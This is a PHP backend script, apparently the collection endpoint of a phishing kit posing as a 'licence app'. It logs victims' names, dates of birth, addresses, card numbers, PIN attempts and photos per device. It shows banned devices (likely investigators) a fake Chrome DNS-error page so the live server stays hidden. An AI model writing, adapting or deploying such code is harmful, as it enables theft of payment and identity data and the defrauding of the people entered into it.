<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

$data = json_decode(file_get_contents('php://input'), true) ?? [];

// === EARLY BAN CHECK USING DEVICE ID ===
$bannedFile = '/var/www/licence/banned_devices.txt';
$deviceId = $data['deviceId'] ?? 'unknown';

if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($deviceId, $banned)) {
        http_response_code(200);
        $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $host = $_SERVER['HTTP_HOST'];
        ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Site Can't Be Reached</title>
    <style>
        body {
            background-color: #f1f1f1;
            margin: 0;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            color: #5f6368;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
        }
        .icon {
            width: 72px;
            height: 72px;
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg=='); /* Simple dino placeholder if needed, but text is fine too */
            background-repeat: no-repeat;
            margin-bottom: 40px;
        }
        h1 {
            font-size: 22px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 20px;
        }
        p {
            font-size: 14px;
            line-height: 20px;
            margin-bottom: 10px;
        }
        .error-code {
            margin-top: 30px;
            font-size: 12px;
            text-transform: uppercase;
        }
        ul {
            margin-top: 10px;
            padding-left: 20px;
        }
        li {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon"></div>
        <h1>This site can’t be reached</h1>
        <p>Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
        <ul>
            <li>If spelling is correct, try running Windows Network Diagnostics.</li>
        </ul>
        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
    </div>
</body>
</html>
        <?php
        exit;
    }
}

// === Normal logging continues if not banned ===
$timestamp = date('Y-m-d H:i:s');
$ip = $data['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';

$event       = $data['event'] ?? 'unknown';
$success     = $data['success'] ?? false;
$pin_attempt = $data['pin_attempt'] ?? '—';
$name        = $data['name'] ?? '—';
$dob         = $data['dob'] ?? '—';
$address     = $data['address'] ?? '—';
$card        = $data['card'] ?? '—';

// Handle Photo
$photo_path = '—';
if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
    $photosDir = '/var/log/licence-app/photos';
    if (!is_dir($photosDir)) {
        mkdir($photosDir, 0777, true);
    }
    $photo_path = $photosDir . '/' . $deviceId . '.txt';
    file_put_contents($photo_path, $data['photo']);
}

$stateFile  = '/var/log/licence-app/latest_state.json';
$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];

if (!isset($state[$deviceId])) {
    $state[$deviceId] = [
        'deviceId' => $deviceId,
        'ip' => $ip,
        'timestamp' => $timestamp,
        'event' => $event,
        'success' => $success ? 'YES' : 'NO',
        'pin_attempt' => $pin_attempt,
        'name' => $name,
        'dob' => $dob,
        'address' => $address,
        'card' => $card,
        'photo_path' => $photo_path,
        'last_seen' => $timestamp,
        'attempt_count' => 0
    ];
} else {
    $state[$deviceId]['ip'] = $ip;
    $state[$deviceId]['timestamp'] = $timestamp;
    $state[$deviceId]['event'] = $event;
    $state[$deviceId]['success'] = $success ? 'YES' : $state[$deviceId]['success'];
    $state[$deviceId]['pin_attempt'] = $pin_attempt !== '—' ? $pin_attempt : $state[$deviceId]['pin_attempt'];
    $state[$deviceId]['name'] = $name !== '—' ? $name : $state[$deviceId]['name'];
    $state[$deviceId]['dob'] = $dob !== '—' ? $dob : $state[$deviceId]['dob'];
    $state[$deviceId]['address'] = $address !== '—' ? $address : $state[$deviceId]['address'];
    $state[$deviceId]['card'] = $card !== '—' ? $card : $state[$deviceId]['card'];
    if ($photo_path !== '—') {
        $state[$deviceId]['photo_path'] = $photo_path;
    }
    $state[$deviceId]['last_seen'] = $timestamp;
}

if ($event === 'pin_failed' || $event === 'pin_success') {
    $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
}

file_put_contents($stateFile, json_encode($state));

echo json_encode(["status" => "ok"]);
?>
